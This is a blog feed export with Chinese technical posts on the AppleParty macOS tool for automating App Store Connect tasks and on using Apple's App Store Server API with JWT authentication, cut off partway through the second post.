<span class="tag">&lt;<span class="name">software_assets</span> <span class="attr">apple_id</span>=<span class="string">&quot;</span></span></span><span class="template-variable">&#123;apple_id&#125;</span><span class="xml"><span class="tag"><span class="string">&quot;</span> <span class="attr">app_platform</span>=<span class="string">&quot;ios&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">asset</span> <span class="attr">type</span>=<span class="string">&quot;bundle&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">data_file</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><span class="template-variable">&#123;file_size&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">size</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">file_name</span>&gt;</span></span><span class="template-variable">&#123;file_name&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">file_name</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">checksum</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span></span><span class="template-variable">&#123;file_md5&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">checksum</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">data_file</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">asset</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">software_assets</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>详细的格式，可以参考项目里的示例：<a href="https://github.com/37iOS/AppleParty/tree/main/AppleParty/Resources/Transporter">https://github.com/37iOS/AppleParty/tree/main/AppleParty/Resources/Transporter</a>。大家有任务疑问，欢迎在评论区留言哈~</p><h3 id="4-2-App-分析数据、销售趋势"><a href="#4-2-App-分析数据、销售趋势" class="headerlink" title="4.2 App 分析数据、销售趋势"></a>4.2 App 分析数据、销售趋势</h3><p>iOS app 发布上线后，用户从 App Store 搜索和下载 app， 查看 app 产品页面，下载并且使用过程中，app 的使用次数、内购充值、或者崩溃等数据，还有后续的付款和财务报表等。</p><p>这些数据对于游戏运营和财务部门来说，同样非常的重要。一般是在苹果后台查看或下载导出，所以希望能从苹果后台自动化的方式获取到这些数据。</p><p>目前苹果后台关于数据的功能有这三个：</p><p><img src="https://ihtcboy.com/images/2022-AppleParty-15.jpg"></p><ul><li>App 分析</li><li>销售和趋势</li><li>付款和财务报告（目前没有使用）</li></ul><p>注：付款和财务报告是 app 内购买的金额统计和对订单，目前的导出数据需求里，并不需要此数据。</p><h4 id="4-2-1-调研报告"><a href="#4-2-1-调研报告" class="headerlink" title="4.2.1 调研报告"></a>4.2.1 调研报告</h4><p>通过调研，目前主流的方法有以下三种：</p><ul><li><strong>苹果官方</strong>：App Store Connect API：REST API，下载销售和趋势报告（.txt文件）</li><li><strong>苹果官方</strong>：Reporter 命令行工具：.jar包，跨平台，下载销售和趋势报告（.txt文件）</li><li><strong>第三方开源</strong>：Fastlane - Spaceship：需要Ruby环境，获取每日销售明细（json数据）</li></ul><p>对应的文档：</p><ul><li><a href="https://developer.apple.com/documentation/appstoreconnectapi">App Store Connect API | Apple Developer Documentation</a></li><li><a href="https://help.apple.com/itc/appsreporterguide/#/">Reporter 用户指南 3.1.6</a></li><li><a href="https://github.com/fastlane/fastlane/tree/master/spaceship">fastlane/spaceship · fastlane</a></li></ul><h4 id="4-2-2-App-Store-Connect-API"><a href="#4-2-2-App-Store-Connect-API" class="headerlink" title="4.2.2 App Store Connect API"></a>4.2.2 App Store Connect API</h4><blockquote><p>自定义工作流程并实现自动化，以便您集中精力打造出色的 app。这个基于标准规范的 REST API 让您可以跨各种开发者工具 (如 App Store Connect、Xcode 以及“Certificates, Identifiers &amp; Profiles”(证书、标识符和描述文件)) 实现任务自动化，使工作流程更灵活、更高效。这个 API 可用于开发、beta 版测试、管理 app 元数据、生成报告等。</p></blockquote><p><strong>销售和趋势</strong><br>下载报告，以查看您的 app 在所有 Apple 平台上的首次下载量、销售额、收入、预订量、订阅活动等。</p><p><strong>付款和财务报告</strong><br>下载按产品、销售地区、货币、价格等划分的月度收入报告。您可以查看每个月的付费金额，以及任何纳税调整或预扣税。</p><p><strong>URL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https://api.appstoreconnect.apple.com/v1/salesReports</span><br></pre></td></tr></table></figure><p>具体请求参数和响应，可以查看文档：<a href="https://developer.apple.com/documentation/appstoreconnectapi/download_sales_and_trends_reports">Download Sales and Trends Reports | Apple Developer Documentation</a></p><h4 id="4-2-3-Reporter-命令行"><a href="#4-2-3-Reporter-命令行" class="headerlink" title="4.2.3 Reporter 命令行."></a>4.2.3 Reporter 命令行.</h4><blockquote><p>Reporter 是一个命令行工具，可以用来下载您的销售和趋势报告以及付款和财务报告。您还可以查看错误说明以及延迟报告的预计可用时间等信息。如果您的多个开发者帐户使用同一个 Apple ID，您可以在 Reporter 轻松切换帐户。</p></blockquote><p><strong>下载销售和趋势报告</strong><br>使用 Sales.getReport 命令下载销售和趋势报告。</p><p><strong>下载财务报告</strong><br>使用 Finance.getReport 命令可为您下载财务报告。</p><p><strong>语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar Reporter.jar p=[properties file] Sales.getReport [vendor number], [report <span class="built_in">type</span>], [report subtype], [date <span class="built_in">type</span>], [date], [version]*（如适用）</span><br></pre></td></tr></table></figure><p>具体请求参数和响应，可以查看文档：<a href="https://help.apple.com/itc/appsreporterguide/#/apd68da36164">下载销售和趋势报告 - Reporter 用户指南 3.1.6</a></p><h4 id="4-2-4-Spaceship"><a href="#4-2-4-Spaceship" class="headerlink" title="4.2.4 Spaceship"></a>4.2.4 Spaceship</h4><blockquote><p>spaceship exposes both the Apple Developer Center and the App Store Connect API. It’s super fast, well tested and supports all of the operations you can do via the browser. It powers parts of fastlane, and can be leveraged for more advanced fastlane features. Scripting your Developer Center workflow has never been easier!</p><p>spaceship 公开了 Apple Developer Center 和 App Store Connect API。它速度超快，经过充分测试并支持您可以通过浏览器执行的所有操作。它为 fastlane 的部分功能提供支持，并可用于更高级的 fastlane 功能。编写您的开发人员中心工作流程脚本从未如此简单！</p></blockquote><p>相当于第三方对苹果接口的封装，并且是依赖 Ruby 环境执行，对于我们的自动化来说，可以使用。但是，如果是工具化，那么并不适用，所以，不作深入研究。大家有兴趣可以看看：<a href="https://github.com/fastlane/fastlane/blob/master/spaceship/README.md#readme">spaceship · fastlane/fastlane</a>。</p><h4 id="4-2-5-爬虫"><a href="#4-2-5-爬虫" class="headerlink" title="4.2.5 爬虫"></a>4.2.5 爬虫</h4><p>以上介绍的3种方式都不支持获取和下载<strong>App 分析</strong>数据，所以，从目前技术方案来说，爬虫是实现方案中成本和可行性最低的方法。</p><p><strong>爬虫的原理</strong>：模拟开发者输入账号密码（获取到用户的登陆状态），然后点击登陆，点击对应的页面标签，下载对应的数据。</p><p><strong>方案</strong></p><ul><li>用 python 爬虫库</li><li>用 Swift 网络库</li></ul><h4 id="4-2-6-总结"><a href="#4-2-6-总结" class="headerlink" title="4.2.6 总结"></a>4.2.6 总结</h4><table><thead><tr><th>方案</th><th>优点</th><th>缺点</th><th>登陆验证方式</th><th>自动化程度</th></tr></thead><tbody><tr><td>App Store Connect API</td><td>官方维护，接口和文档全</td><td>不支持下载<code>App 分析</code>数据</td><td>API keys</td><td>高</td></tr><tr><td>Reporter 命令行工具</td><td>官方维护，接口和文档全</td><td>不支持下载<code>App 分析</code>数据</td><td>访问令牌</td><td>高</td></tr><tr><td>Fastlane - Spaceship</td><td>命令自动化工具</td><td>不支持下载<code>App 分析</code>数据</td><td>API keys、账密(+验证码)</td><td>中</td></tr><tr><td>爬虫</td><td>苹果后台所有功能都支持</td><td>如果接口变更，<br>开发者也需要调整</td><td>账密(+验证码)</td><td>中</td></tr></tbody></table><p>综上，从目前业务场景和业务需求来说，爬虫是当前<strong>折中的方案</strong>，也是最快和最有效的方案。未来，如果苹果 <code>App Store Connect API</code> 或 <code>Reporter 工具</code> 支持下载<strong>App 分析</strong>数据，那么，这将是更好的方案。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>AppleParty 要解决的问题是开发者有很多 app 的情况下的管理，比如有多语言、频繁更新等，当然也有针对游戏行业的需求，比如素材会经常更新，内购买项目达到100+个，人工处理显示无法满足。而为什么不考虑做成命令行的工具？因为希望相关的这块工具可以交给运营处理，而不需要技术关注。</p><p>大家可能有一个疑问：<code>为什么不使用 SwiftUI</code>？因为考虑工具的通用性，兼容更多的系统版本，显然才是工具要做的事情，所以，相信未来一定会用上 SwiftUI 的！另外，苹果为什么不推出批量操作和更加完善的工具呢？很显然，苹果在努力打造 <code>App Store Connect API</code>，但其实苹果的功能非常多，一步到位解决所有的问题不太现实，所以，我们也非常期待苹果新的 API，来解决更多重复操作的问题。</p><p>以上就是  AppleParty 项目的内容简单介绍，大家可以在 GitHub <a href="https://github.com/37iOS/AppleParty">37iOS/AppleParty</a> 查看详细的源代码。如果觉得不错，给我们点个赞！如有疑问或者问题，欢迎留言交流~</p><p>最后，Apple Party（苹果派）是一个新生孩，所以可能会存在很多缺陷，甚至不能满足所有的场景，希望大家多担待和理解万岁，期待大家一起给项目提建议，提代码，一起卷好！</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的资讯~</p></blockquote><h3 id="特别感谢"><a href="#特别感谢" class="headerlink" title="特别感谢"></a>特别感谢</h3><ul><li><a href="https://github.com/Alamofire/Alamofire">Alamofire/Alamofire</a></li><li><a href="https://github.com/Kitura/Swift-SMTP">Kitura/Swift-SMTP</a></li><li><a href="https://github.com/SnapKit/SnapKit">SnapKit/SnapKit</a></li><li><a href="https://github.com/sparkle-project/Sparkle">sparkle-project/Sparkle</a></li><li><a href="https://github.com/tid-kijyun/Kanna">tid-kijyun/Kanna</a></li><li><a href="https://github.com/drmohundro/SWXMLHash">drmohundro/SWXMLHash</a></li><li><a href="https://github.com/jdg/MBProgressHUD">jdg/MBProgressHUD</a></li><li><a href="https://github.com/joshuajylin/MBProgressHUD-macOS">joshuajylin/MBProgressHUD-macOS</a></li><li><a href="https://github.com/Yueoaix/SymbolicatorX">Yueoaix/SymbolicatorX</a></li><li><a href="https://github.com/fpotter/ExpandingDatePicker">fpotter/ExpandingDatePicker</a></li><li><a href="https://github.com/kishikawakatsumi/KeychainAccess">kishikawakatsumi/KeychainAccess</a></li></ul><h2 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h2><ul><li><a href="https://github.com/37iOS/AppleParty">37iOS/AppleParty: macOS App for App Store Connect to Improve Processing Efficiency and Enjoy the Party.</a></li><li><a href="https://juejin.cn/post/7051512478630412301">用 SwiftUI 实现一个开源的 App Store - 掘金</a></li><li><a href="https://apps.apple.com/cn/app/transporter/id1450874784">Apple Transporter.app</a></li><li><a href="https://support.apple.com/zh-cn/HT204397">使用 App 专用密码 - Apple 支持 (中国)</a></li><li><a href="https://itunespartner.apple.com/tv/articles/transporter_getting-set-up">What is Transporter?</a></li><li><a href="https://help.apple.com/itc/transporteruserguide/">Transporter 用户指南 2.0</a></li><li><a href="https://help.apple.com/itc/transporter/#/">Transporter 帮助</a></li><li><a href="https://help.apple.com/asc/appsspec/">App 元数据规范 5.11</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi">App Store Connect API | Apple Developer Documentation</a></li><li><a href="https://help.apple.com/itc/appsreporterguide/#/">Reporter 用户指南 3.1.6</a></li><li><a href="https://help.apple.com/itc/appsreporterguide/#/apd68da36164">下载销售和趋势报告 - Reporter 用户指南 3.1.6</a></li><li><a href="https://github.com/fastlane/fastlane/tree/master/spaceship">fastlane/spaceship · fastlane</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi/download_sales_and_trends_reports">Download Sales and Trends Reports | Apple Developer Documentation</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7081069026515877919&quot;&gt;开源一款苹果 macOS 工具 - AppleParty（苹果派） - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AppleParty 是 37手游 iOS 团队研发，实现快速操作 App Store Connect 后台的自动化 macOS 工具。本文会介绍工具诞生的背景、使用教程和代码实现的简介，希望通过开源与大家分享成果，让更多人一起参与改进和完善，最后一起提高效率和拓展探索方向。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="AppleParty" scheme="https://ihtcboy.com/tags/AppleParty/"/>
    
    <category term="苹果派" scheme="https://ihtcboy.com/tags/%E8%8B%B9%E6%9E%9C%E6%B4%BE/"/>
    
    <category term="macOS app" scheme="https://ihtcboy.com/tags/macOS-app/"/>
    
  </entry>
  
  <entry>
    <title>WWDC21 - App Store Server API 实践总结</title>
    <link href="https://ihtcboy.com/2022/01/25/2022-01-25_WWDC21-AppStoreServerAPI%E5%AE%9E%E8%B7%B5%E6%80%BB%E7%BB%93/"/>
    <id>https://ihtcboy.com/2022/01/25/2022-01-25_WWDC21-AppStoreServerAPI%E5%AE%9E%E8%B7%B5%E6%80%BB%E7%BB%93/</id>
    <published>2022-01-25T03:14:10.000Z</published>
    <updated>2022-12-31T15:09:46.777Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7056976669139009573">WWDC21 - App Store Server API 实践总结 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><blockquote><p>关于 App Store 用户退款时并没有通知开发者，直到 2020 年 6 月苹果提供了退款通知，但是因为不是 API 方式，导致开发者不一定能收到退款通知。另外像用户充值成功但 app 没有提供金币或服务等，开发者一般无法判断用户是否真的付款了。综上，苹果在 WWDC21 带来了全新强大的 App Store Server API，本文让我们从了解到实践的过程，全面认识 App Store Server API。 </p></blockquote><span id="more"></span><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-00.png" alt="AppStoreServerAPI-00"></p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>大家好，我们在去年在 WWDC21 后 6 月 17 日发表了总结文章《<a href="https://juejin.cn/post/6974733392260644895">苹果iOS内购三步曲 - WWDC21</a>》。当时只是根据苹果的演讲内容进行了梳理，当时的很多接口和功能并没有上线，比如根据玩家的发票订单号查询用户的苹果收据，查询历史订单接口等，当时文章并没有深入的分析，而如今都 2022 年了，苹果 App Store Server API 已经上线，所以，今天我们一起来了解一下，相关 API 的具体使用实践吧~</p><h2 id="二、App-Store-Server-API"><a href="#二、App-Store-Server-API" class="headerlink" title="二、App Store Server API"></a>二、App Store Server API</h2><p>首先，我们先列一下，WWDC21 苹果提供了那些 Server API，然后我们在看看怎么实践这些接口，最后在总结一下注意事项。</p><h3 id="2-1-API-简介"><a href="#2-1-API-简介" class="headerlink" title="2.1 API 简介"></a>2.1 API 简介</h3><p><strong>查询用户订单的收据</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/lookup/</span>&#123;orderId&#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://developer.apple.com/documentation/appstoreserverapi/look_up_order_id">Look Up Order ID</a>：使用订单ID从收据中获取用户的应用内购买项目收据信息。</li></ul><p><strong>查询用户历史收据</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/history/</span>&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://developer.apple.com/documentation/appstoreserverapi/get_transaction_history">Get Transaction History</a>：获取用户在您的 app 的应用内购买交易历史记录。</li></ul><p><strong>查询用户内购退款</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/refund/</span>lookup/&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://developer.apple.com/documentation/appstoreserverapi/get_refund_history">Get Refund History</a>：获取 app 中为用户退款的所有应用内购买项目的列表。</li></ul><p><strong>查询用户订阅项目状态</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/subscriptions/</span>&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://developer.apple.com/documentation/appstoreserverapi/get_all_subscription_statuses">Get All Subscription Statuses</a>：获取您 app 中用户所有订阅的状态。</li></ul><p><strong>提交防欺诈信息</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/transactions/</span>consumption/&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><p><a href="https://developer.apple.com/documentation/appstoreserverapi/send_consumption_information">Send Consumption Information</a>：当用户申请退款时，苹果通知（CONSUMPTION_REQUEST）开发者服务器，开发者可在12小时内，提供用户的信息（比如游戏金币是否已消费、用户充值过多少钱、退款过多少钱等），最后苹果收到这些信息，协助“退款决策系统” 来决定是否允许用户退款。</p><p><strong>延长用户订阅的时长</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/subscriptions/</span>extend/&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><p><a href="https://developer.apple.com/documentation/appstoreserverapi/extend_a_subscription_renewal_date">Extend a Subscription Renewal Date</a>：使用原始交易标识符延长用户有效订阅的续订日期。（相当于免费给用户增加订阅时长）</p><h3 id="2-2-接口参数说明"><a href="#2-2-接口参数说明" class="headerlink" title="2.2 接口参数说明"></a>2.2 接口参数说明</h3><p><strong>App Store Server API</strong> 是苹果提供给开发者，通过服务器来管理用户在 App Store 应用内购买的一套接口（REST API）。</p><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>线上环境的 URL：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>api.storekit.itunes.apple.com/</span><br></pre></td></tr></table></figure><p>沙盒环境测试：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="variable">s:</span>//api.storekit-<span class="keyword">sandbox</span>.itunes.apple.<span class="keyword">com</span>/</span><br></pre></td></tr></table></figure><h4 id="JWT-简介"><a href="#JWT-简介" class="headerlink" title="JWT 简介"></a>JWT 简介</h4><p>调用这些 API 需要 JWT（<code>JSON Web Token</code>）进行授权。那么什么是 JWT 呢？</p><p><code>JWT</code> 是一个开放式标准（规范文件 <a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519</a>），用于在各方之间以 JSON 对象安全传输信息。有两种实现，一种基于 <code>JWS</code> 的实现使用了<code>BASE64URL</code>编码和<strong>数字签名</strong>的方式对传输的<code>Claims</code>提供了完整性保护，也就是仅仅保证传输的<code>Claims</code>内容不被篡改，但是会暴露明文。另一种是基于 <code>JWE</code> 实现的依赖于加解密算法、<code>BASE64URL</code>编码和<strong>身份认证</strong>等手段提高传输的<code>Claims</code>内容被破解的难度。</p><ul><li><code>JWS</code>（规范文件 <a href="https://datatracker.ietf.org/doc/html/rfc7515">RFC 7515</a>）： <code>JSON Web Signature</code>，表示使用 <code>JSON</code> 数据结构和 <code>BASE64URL</code> 编码表示经过数字签名或消息认证码（<code>MAC</code>）认证的内容。</li><li><code>JWE</code>（规范文件 <a href="https://datatracker.ietf.org/doc/html/rfc7516">RFC 7516</a>）： <code>JSON Web Encryption</code>，表示基于 <code>JSON</code> 数据结构的加密内容。</li></ul><p>目前苹果 JWT 相关的内容，都是基于 JWS 实现，所以下文的 JWT 默认指 JWS。</p><p>JWT（JWS) 由三部分组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64(header) + &#x27;.&#x27; + base64(payload) + &#x27;.&#x27; + sign( Base64(header) + &quot;.&quot; + Base64(payload) )</span><br></pre></td></tr></table></figure><ul><li><strong>header</strong>：主要声明了 JWT 的签名算法；</li><li><strong>payload</strong>：主要承载了各种声明并传递明文数据；</li><li><strong>signture</strong>：拥有该部分的 JWT 被称为 JWS，也就是签了名的 JWS。</li></ul><p>JWT 的内容示例： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidGVhbSI6IjM35omL5ri45oqA5pyv6L-Q6JCl5Zui6ZifIiwiYXV0aG9yIjoiaUhUQ2JveSIsImlhdCI6MTUxNjIzOTAyMn0.dL5U_t_DcfLTY9WolmbU-j81jrZqs1HhHqYKM6HSxVgWCGUAKLzwVrnLuuMCnSRnrW9vmGKNqNvrzG8cEwxvAg</span><br></pre></td></tr></table></figure><p>详细的 JWT 内容，这里就略过了，大家可以自动搜索了解更多。</p><h4 id="组装-JWT"><a href="#组装-JWT" class="headerlink" title="组装 JWT"></a>组装 JWT</h4><p>知道了基本的 JWT 知识，我们就可以开工啦。要生成签名的 JWT 有三步：</p><ol><li>创建 JWT 标头。</li><li>创建 JWT 有效负载。</li><li>在 JWT 上签名。</li></ol><p>JWT header 示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;ES256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;2X9R4HXF34&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JWT payload 示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;57246542-96fe-1a63e053-0824d011072a&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1623085200</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1623086400</span>,</span><br><span class="line">  <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;appstoreconnect-v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;nonce&quot;</span>: <span class="string">&quot;6edffe66-b482-11eb-8529-0242ac130003&quot;</span>,</span><br><span class="line">  <span class="string">&quot;bid&quot;</span>: <span class="string">&quot;com.example.testbundleid2021&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是苹果要求的字段规范，所以不同的 JWT 字符和内容并一样，所以，我们看看苹果对这些字段的定义：</p><table><thead><tr><th>字段</th><th>字段说明</th><th>字段值说明</th></tr></thead><tbody><tr><td><code>alg</code></td><td>Encryption Algorithm，加密算法</td><td>默认值：ES256。App Store Server API 的所有 JWT 都必须使用 ES256 加密进行签名。</td></tr><tr><td><code>kid</code></td><td>Key ID，密钥ID</td><td>您的私钥ID，值来自 App Store Connect，下文会讲解。</td></tr><tr><td><code>typ</code></td><td>Token Type，令牌类型</td><td>默认值：JWT</td></tr><tr><td><code>iss</code></td><td>Issuer，发行人</td><td>您的发卡机构ID，值来自 App Store Connect 的密钥页面，下文会讲解。</td></tr><tr><td><code>iat</code></td><td>Issued At，发布时间</td><td>秒，以 UNIX 时间（例如：1623085200）发布令牌的时间</td></tr><tr><td><code>exp</code></td><td>Expiration Time，到期时间</td><td>秒，令牌的到期时间，以 UNIX 时间为单位。在iat中超过 60 分钟过期的令牌无效（例如：1623086400）</td></tr><tr><td><code>aud</code></td><td>Audience，受众</td><td>固定值：appstoreconnect-v1</td></tr><tr><td><code>nonce</code></td><td>Unique Identifier，唯一标识符</td><td>您仅创建和使用一次的任意数字(例如: “6edffe66-b482-11eb-8529-0242ac130003”)。可以理解为 UUID 值。</td></tr><tr><td><code>bid</code></td><td>Bundle ID，套装ID</td><td>您的 app 的套装ID（例如：“com.example.testbundleid2021”)</td></tr></tbody></table><p>其中 <code>kid</code> 和 <code>iss</code> 值是从 <a href="https://appstoreconnect.apple.com/">App Store Connect</a> 后台创建和获取。</p><h5 id="生成密钥-ID（kid）"><a href="#生成密钥-ID（kid）" class="headerlink" title="生成密钥 ID（kid）"></a>生成密钥 ID（kid）</h5><p>要生成密钥，您必须在 App Store Connect 中具有管理员角色或帐户持有人角色。登录 <a href="https://appstoreconnect.apple.com/">App Store Connect</a> 并完成以下步骤：</p><ol><li>选择 “用户和访问”，然后选择 “密钥” 子标签页。</li><li>在 “密钥类型” 下选择 “App内购买项目”。</li><li>单击 “生成API内购买项目密钥”（如果之前创建过，则点击 “添加（+）” 按钮新增。）。</li><li>输入密钥的名称。该名称仅供您参考，名字不作为密钥的一部分。</li><li>单击 “生成”。</li></ol><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-01.jpg" alt="AppStoreServerAPI-01"></p><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-02.jpg" alt="AppStoreServerAPI-02"></p><p>生成的密钥，有一列名为 “密钥 ID” 就是 <code>kid</code> 的值，鼠标移动到文字就会显示 <code>拷贝密钥 ID</code>，点击按钮就可以复制 kid 值。</p><h5 id="生成-Issuer（iss）"><a href="#生成-Issuer（iss）" class="headerlink" title="生成 Issuer（iss）"></a>生成 Issuer（iss）</h5><p>同理，<code>iss</code> 值的生成，类似：</p><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-03.jpg" alt="AppStoreServerAPI-03">®®</p><p><strong>issuer ID</strong> 值就是 <code>iss</code> 的值。</p><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-04.jpg" alt="AppStoreServerAPI-04"></p><h4 id="生成和签名-JWT"><a href="#生成和签名-JWT" class="headerlink" title="生成和签名 JWT"></a>生成和签名 JWT</h4><p>获取到这里参数后，就需要签名，那么还需要签名的密钥文件。</p><h5 id="下载并保存密钥文件"><a href="#下载并保存密钥文件" class="headerlink" title="下载并保存密钥文件"></a>下载并保存密钥文件</h5><p>App Store Connect 密钥文件，在刚才生成 <code>kid</code>时，列表右边有 <code>下载 App 内购买项目密钥</code> 按钮（仅当您尚未下载私钥时，才会显示下载链接。）：</p><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-05.jpg" alt="AppStoreServerAPI-05"></p><p><strong>此私钥只能一次性下载！</strong></p><p>另外 Apple 不保留私钥的副本，将您的私钥存放在安全的地方。</p><blockquote><p>注意：将您的私钥存放在安全的地方。不要共享密钥，不要将密钥存储在代码仓库中，不要将密钥放在客户端代码中。如果您怀疑私钥被盗，请立即在 App Store Connect 中撤销密钥。有关详细信息，请参阅 <a href="https://developer.apple.com/documentation/appstoreconnectapi/revoking_api_keys">撤销API密钥</a>。</p></blockquote><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-06.jpg" alt="AppStoreServerAPI-06"></p><blockquote><p>API密钥有两个部分：苹果保留的公钥和您下载的私钥。开发者使用私钥对授权 API 在 App Store 中访问数据的令牌进行签名。</p></blockquote><p>需要注意的是，App Store Server API 密钥是 App Store Server API 所独有的，不能用于其他 Apple 服务（比如 Sign in with Apple 服务或 App Store Connet API 服务等。）。</p><h4 id="为-API-请求生成令牌"><a href="#为-API-请求生成令牌" class="headerlink" title="为 API 请求生成令牌"></a>为 API 请求生成令牌</h4><p>最终，JWT Header 和 payload 示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;ES256&quot;</span>,</span><br><span 